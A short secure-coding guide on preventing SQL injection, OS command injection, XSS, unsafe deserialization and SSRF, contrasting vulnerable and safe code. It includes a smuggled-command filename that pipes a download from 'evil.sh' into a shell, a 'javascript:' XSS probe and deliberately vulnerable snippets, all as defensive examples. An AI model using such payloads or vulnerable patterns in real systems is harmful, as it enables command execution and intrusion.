# Input Validation and Injection Prevention

Injection occurs whenever untrusted data is concatenated into an interpreter's command string (SQL, OS Shell, HTML/JS DOM, or Object Deserializer).

---

## 1. The Four Major Injection Classes & Exact Defenses

### 1. SQL Injection (SQLi)
- **Vulnerable**: `conn.execute(f"SELECT * FROM users WHERE email = '{email}'")`
- **Safe**: `conn.execute("SELECT * FROM users WHERE email = ?", (email,))`
- **Dynamic Column / Sort Order Allowlisting**: Bind parameters cannot substitute column names (`ORDER BY ?`). Validate dynamic sort columns against an explicit frozen dictionary or set:
  ```python
  ALLOWED_SORTS = {"created_at": "created_at DESC", "frame_num": "frame_num ASC"}
  order_clause = ALLOWED_SORTS.get(user_sort, "created_at DESC")
  ```

### 2. OS Command Injection
- **Vulnerable**: `os.system(f"ffmpeg -i {user_file} out.mp4")` or `subprocess.run(cmd, shell=True)` (a filename like `video.mp4; curl evil.sh | sh` executes arbitrary shell commands).
- **Safe**: Always pass an argument array with `shell=False` and prefix untrusted filenames with `--` or an explicit directory path so a filename starting with `-` cannot be interpreted as a CLI flag:
  ```python
  subprocess.run(["ffmpeg", "-y", "-i", str(safe_path), str(out_path)], check=True, shell=False, timeout=60)
  ```

### 3. Cross-Site Scripting (XSS)
- **Vulnerable**: `element.innerHTML = userComment` or `dangerouslySetInnerHTML`.
- **Safe**: Use `element.textContent = userComment` or framework auto-escaping bindings (`{userComment}` in React). Validate user-supplied link URLs so `href` starts strictly with `https://`, `http://`, or `/` (blocking `javascript:alert(1)` and `data:` URIs).

### 4. Unsafe Deserialization & SSRF
- **Deserialization**: Never pass untrusted bytes to Python `pickle.loads()`, `yaml.load()` (use `yaml.safe_load()`), `eval()`, or Godot `ResourceLoader.load()` on user saves. Use `json.loads()` with strict schema validation.
- **Server-Side Request Forgery (SSRF)**: When fetching a user-provided URL on the backend, parse the hostname, resolve its IP, and block private/loopback/metadata IP ranges (`127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.169.254` cloud metadata endpoint).
